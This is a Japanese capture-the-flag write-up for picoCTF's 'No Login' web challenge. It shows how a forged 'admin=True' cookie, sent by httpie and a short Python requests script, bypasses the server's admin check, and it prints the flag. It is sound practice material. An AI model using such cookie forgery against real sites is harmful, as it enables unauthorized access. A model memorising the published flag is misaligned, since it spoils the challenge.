# No Login

## solve
```
Looks like someone started making a website but never got around to making a login, 
but I heard there was a flag if you were the admin. 
http://2018shell.picoctf.com:33889 (link)
```

## Hint
```
What is it actually looking for in the cookie?
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83586780-51849480-a588-11ea-83d7-e1072ba0361f.png)

問題に移動するとloginページが表示されます。

今回、問題分にもあるように`admin`でloginをしなければならないと考えられます。

試しに`Flag`のボタンを押してみます。

![2](https://user-images.githubusercontent.com/47602064/83586895-9f010180-a588-11ea-971f-220c3d50ccc1.png)

`I'm sorry it doesn't look like you are the admin.`

すると以上にように`admin`でないと無理そうとわかりました。

<br>

ヒントには`cookie`が関係していると思うので通信を見てみます。

```http
GET /flag HTTP/1.1
Host: 2018shell.picoctf.com:33889

```

```http
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://2018shell.picoctf.com:33889/
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIkknbSBzb3JyeSBpdCBkb2Vzbid0IGxvb2sgbGlrZSB5b3UgYXJlIHRoZSBhZG1pbi4iXX1dfQ.EbiUTw.cowsewXUDHu8buqlsHASNpRlTFM; HttpOnly; Path=/

```

requestを見る限り、`/flag`にアクセスしていることがわかります。

そして次のrequestでリダイレクトしていました。

responeを見ると`Vary: Cookie`とcookieがなっています。

これは`Vary`に指定された`Cookie`によって表示される内容を変える仕組みだそうです。

今回の`Cookie`内容は`Set-Cookie`でbase64でエンコードされてセットされています。

試しにセットされた内容をデコードしてみます。

```
$ echo eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIkknbSBzb3JyeSBpdCBkb2Vzbid0IGxvb2sgbGlrZSB5b3UgYXJlIHRoZSBhZG1pbi4iXX1dfQ | base64 -d
{"_flashes":[{" t":["warning","I'm sorry it doesn't look like you are the admin."]}]}
```

これにより`I'm sorry it doesn't look like you are the admin.`が`Cookie`にセットされて次のページで表示されるようになっていました。

なのでこれを利用して`admin`でのloginができれば良さそうです。

<br>

単純には`admin`でのloginが`True`になればよいのでこれを`cookie`にセットすると以下のような感じになります。

`Cookie:admin = True`

これを`/flag`に送ってみます。

```http
$ http GET http://2018shell.picoctf.com:33889/flag "Cookie:admin = True"
HTTP/1.1 200 OK

<!DOCTYPE html>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{n0l0g0n_n0_pr0bl3m_26b0181a}</code></p>
            <!-- <p><a class="btn btn-lg btn-success" href="admin" role="button">Click here for the flag!</a> -->
            <!-- </p> -->
        </div>

```

すると`admin`でアクセスができてflagが表示されました。

<br>

デバッグや`Burp`で編集してCookieを追加して送信すると以下のように表示されます。

![3](https://user-images.githubusercontent.com/47602064/83593785-90bae180-a598-11ea-9335-074953cfc1e5.png)

<br>

Pythonで実行すると以下のプログラムで綺麗にflagを得ることが出来ます。

```python
#!/usr/bin/python

import requests
import re

jar = {'admin': 'True'}
r = requests.get('http://2018shell1.picoctf.com:33889/flag', cookies=jar)
source = r.text

print re.findall(r'(picoCTF\{.+\})', source)[0]
```

<br><br>

## FLAG: picoCTF{n0l0g0n_n0_pr0bl3m_26b0181a}
